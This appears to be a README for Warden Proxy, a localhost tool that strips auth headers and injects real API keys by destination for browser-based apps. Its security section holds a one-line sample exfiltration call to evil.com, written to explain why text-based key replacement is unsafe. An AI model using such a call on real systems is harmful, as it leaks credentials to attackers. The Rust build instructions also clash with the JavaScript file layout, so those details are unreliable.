# 🔒 Warden Proxy

**A localhost proxy that gives browser-sandboxed applications safe, controlled access to the outside world — transparently.**

Every browser tab is a virtual machine — sandboxed, isolated, secure. But that sandbox also means browser apps can't hold API keys safely, can't talk to local devices, and can't access external services without exposing credentials in client-side code.

Warden solves this. It runs on localhost, sits between your browser apps and the outside world, and **transparently handles authentication** so your apps never need real API keys. Your AI agents, web apps, and browser-based tools get the capabilities they need without breaking the sandbox — and without ever touching a real credential.

## Why Warden?

The browser is becoming the universal virtual machine. WebAssembly runs code at near-native speed. Every device on earth has a browser. AI agents are increasingly running inside browser tabs.

But browser VMs have a fundamental problem: **they can't safely hold secrets.** Any API key in client-side JavaScript is visible to anyone who opens DevTools. Browser extensions can read them. Malicious scripts can exfiltrate them.

Warden is the **trusted assistant at the door** — the browser keeps everything safely contained, and Warden carries things in and out on behalf of the sandboxed applications inside.

## How It Works

### Transparent Mode (Recommended)

Apps don't even know Warden exists. They use fake API keys and make normal API calls. A Service Worker silently reroutes everything through Warden, which swaps in the real credentials.

```
┌──────────────────────────────────────────────────────┐
│  Browser Tab (The Virtual Machine)                   │
│                                                      │
│  App code (unchanged):                               │
│  fetch("https://api.openai.com/v1/chat/completions", │
│    { headers: { Authorization: "Bearer sk-fake" } }) │
│                                                      │
│         │                                            │
│         ▼                                            │
│  ┌─────────────────────────────┐                     │
│  │  Warden Service Worker      │                     │
│  │  • Intercepts API calls     │                     │
│  │  • Strips fake auth headers │                     │
│  │  • Reroutes to localhost    │                     │
│  └──────────────┬──────────────┘                     │
└─────────────────┼────────────────────────────────────┘
                  │
       ┌──────────▼──────────┐
       │   Warden Proxy      │
       │   localhost:7400    │
       │                     │
       │  1. Strip ALL auth  │  ← Defense in depth
       │  2. Match service   │  ← By destination URL
       │  3. Inject real key │  ← From local vault
       │  4. Check allowlist │  ← Origin-based access
       │  5. Rate limit      │  ← Prevent runaway costs
       │  6. Log & forward   │  ← Audit trail
       └──┬────┬────┬───┬───┘
          │    │    │   │
       ┌──▼┐ ┌─▼─┐ ▼  ┌▼──────┐
       │LLM│ │API│ DB │Devices │
       └───┘ └───┘    └───────┘
```

**The app thinks it's talking to OpenAI. It's actually talking to Warden. It never knows the difference.**

### Direct Mode

For apps built with Warden in mind, call the proxy directly:

```javascript
fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    model: "gpt-4",
    messages: [{ role: "user", content: "Hello" }]
  })
});
```

No API key needed in the request. Warden injects it based on the destination service.

## 🔐 Security Model

Warden's security is built on one core principle: **authentication is determined by destination, never by request content.**

### The Problem with Text-Based Key Injection

A naive proxy might search for a fake key in the request and replace it with a real one. This is **catastrophically insecure**:

```javascript
// Malicious app sends fake key to an attacker's server
fetch("https://evil.com/steal?key=sk-fake-1234")
// A naive text-replacement proxy would inject the REAL key here
// Now evil.com has your credentials
```

### How Warden Does It

1. **Strip ALL auth** — Every request has its auth headers (`Authorization`, `x-api-key`, `api-key`, `cookie`) completely removed. Twice — once in the Service Worker (client-side) and again in the proxy (server-side). Defense in depth.

2. **Match by destination** — Warden checks where the request is going: "This is headed to `api.openai.com`." That's a registered service.

3. **Inject by identity** — The real API key is injected based solely on the destination service match. Not based on anything the app sent.

4. **Allowlist enforcement** — Only registered service destinations receive key injection. A request to `evil.com` gets nothing — no key, no help, no information.

**The app can put literally anything in the Authorization header** — a fake key, its grandma's phone number, the lyrics to a song. Warden doesn't care. It throws it all away and injects the real key based on where the request is going.

This means a malicious or buggy app **cannot exfiltrate real credentials**, because:
- It never sees them
- It can't influence which key gets injected
- It can't trick Warden into injecting keys for unauthorized destinations

## Quick Start

```bash
# Clone and build (requires Rust)
git clone https://github.com/nwcnwc/warden-proxy.git
cd warden-proxy
cargo build --release

# Or download a pre-built binary (coming soon)
# curl -fsSL https://github.com/nwcnwc/warden-proxy/releases/latest/download/warden -o warden

# Initialize config
./target/release/warden init

# Edit ~/.warden/config.json with your key sources
# Start the proxy
./target/release/warden start
```

### Transparent Mode (Service Worker)

Add one script tag to your HTML — that's it:

```html
<script src="http://127.0.0.1:7400/client/warden-loader.js"></script>
```

Now every `fetch()` call to a registered API is transparently proxied through Warden. Your app code doesn't change. Your fake keys keep working. The real keys stay safe.

### Direct Mode

```javascript
// No key needed — Warden injects it
const response = await fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    model: "gpt-4",
    messages: [{ role: "user", content: "Hello" }]
  })
});
```

## Configuration

```json
// ~/.warden/config.json
{
  "port": 7400,
  "log_level": "info",
  "keys": {
    "openai": {
      "base_url": "https://api.openai.com",
      "header": "Authorization",
      "source": {
        "provider": "1password",
        "ref": "op://Development/OpenAI/credential",
        "prefix": "Bearer "
      }
    },
    "anthropic": {
      "base_url": "https://api.anthropic.com",
      "header": "x-api-key",
      "source": {
        "provider": "env",
        "ref": "ANTHROPIC_API_KEY"
      }
    },
    "google": {
      "base_url": "https://generativelanguage.googleapis.com",
      "header": "x-goog-api-key",
      "source": {
        "provider": "keyring",
        "ref": "warden-proxy/google"
      }
    }
  },
  "access": [
    {
      "origin": "http://localhost:*",
      "allow": ["openai", "anthropic", "google"]
    }
  ],
  "limits": {
    "openai": { "rpm": 60, "rpd": 1000 },
    "anthropic": { "rpm": 30, "rpd": 500 }
  }
}
```

### Key Sources

Every API key can come from a different source. Mix and match per-service:

| Provider | Config | What it does |
|----------|--------|-------------|
| **1Password** | `"provider": "1password"` | Fetches via `op` CLI. Ref: `op://Vault/Item/field` |
| **Bitwarden** | `"provider": "bitwarden"` | Fetches via `bw` CLI. Ref: item name or ID |
| **Bitwarden Secrets** | `"provider": "bitwarden-secrets"` | Fetches via `bws` CLI. Ref: secret ID |
| **OS Keyring** | `"provider": "keyring"` | macOS Keychain, Linux Secret Service, Windows Credential Manager |
| **Encrypted Vault** | `"provider": "encrypted"` | Local encrypted file (`~/.warden/vault.enc`) |
| **Environment Variable** | `"provider": "env"` | Reads from `$VAR_NAME` |
| **Inline** | `"provider": "inline"` | Plain text in config (development only) |

Source fields:
- `ref` — Reference string (secret path, env var name, keyring service, etc.)
- `prefix` — Prepended to resolved value (e.g., `"Bearer "` for Authorization headers)
- `field` — Field name for password managers (default: `"credential"` or `"password"`)
- `path` — File path for encrypted vault (default: `~/.warden/vault.enc`)

Legacy mode still works: use `"value": "Bearer ${OPENAI_API_KEY}"` for simple env var interpolation without a `source` block.

## Architecture

```
warden-proxy/
├── bin/warden.js          # CLI entry point
├── src/
│   ├── index.js           # HTTP server, request routing
│   ├── proxy.js           # Core proxy: auth stripping, key injection, forwarding
│   ├── cors.js            # CORS preflight and header handling
│   ├── access.js          # Origin-based allowlist controller
│   ├── vault.js           # API key storage and lookup
│   ├── limiter.js         # Per-service rate limiting
│   ├── logger.js          # Structured request logging
│   └── client/
│       ├── warden-sw.js   # Service Worker (runs in browser)
│       └── warden-loader.js  # One-line script to activate SW
├── test/
│   ├── proxy.test.js      # Core proxy + access + rate limit tests
│   └── security.test.js   # Auth stripping + destination-based injection tests
└── docs/
```

### Key Components

| Component | What it does |
|-----------|-------------|
| **Service Worker** | Runs in the browser. Intercepts fetch() calls to registered APIs. Strips auth headers. Reroutes to Warden. Apps don't know it exists. |
| **Proxy Server** | Runs on localhost. Strips auth again (defense in depth). Matches destination to registered service. Injects real key. Forwards request. |
| **Key Vault** | Stores API keys locally. Supports env variable interpolation. Keys never leave the machine. |
| **Access Controller** | Origin-based allowlisting. Controls which browser origins can access which services. Wildcard support. |
| **Rate Limiter** | Per-service request limits (per-minute, per-day). Prevents runaway costs from buggy or malicious apps. |

## Use Cases

### 🤖 AI Agents in Browser VMs
Build AI agents that run entirely in browser tabs with full LLM access. The agent uses fake keys, Warden provides real access. The agent is sandboxed — it can think and create, but it can't steal credentials or access unauthorized services.

### 🌐 Browser-as-VM Applications
Any application treating the browser as a computing platform can use Warden for safe external access — without embedding secrets in client code.

### 🔧 Local Development
Replace scattered `.env` files and hardcoded keys across projects with a single, secure key store. All your local dev servers share one Warden instance.

### 📱 Device Bridging (Planned)
Build browser dashboards that control local hardware — cameras, IoT devices, home automation — through Warden's device bridge plugin system.

## The Bigger Picture

As AI moves toward programming in languages optimized for machines (like WebAssembly) rather than humans, and as the browser becomes the universal VM, **the need for a trusted intermediary between sandboxed code and the outside world becomes critical.**

Warden is that intermediary. The browser is the padded room. Warden is the trusted assistant who brings things to the door.

Read more: [The Browser Is Already a Virtual Machine](docs/browser-as-vm.md) *(coming soon)*

## Roadmap

- [x] Core HTTP proxy with service routing
- [x] API key vault with environment variable interpolation
- [x] Origin-based access control with wildcard support
- [x] Per-service rate limiting (rpm/rpd)
- [x] CORS handling for browser origins
- [x] Transparent Service Worker intercept
- [x] Defense-in-depth auth stripping (client + server)
- [x] Request logging with structured output
- [x] Security test suite
- [ ] CLI commands: `add-key`, `remove-key`, `allow`, `deny`
- [ ] Encrypted key storage at rest
- [ ] WebSocket proxy support
- [ ] Streaming response support (SSE)
- [ ] Device bridge plugin system
- [ ] Browser extension (alternative to Service Worker)
- [ ] Admin dashboard (view logs, manage keys, monitor usage)
- [ ] WASI integration (for Wasm apps outside the browser)

## Contributing

This project is in early development. Issues, ideas, and PRs welcome.

## License

MIT
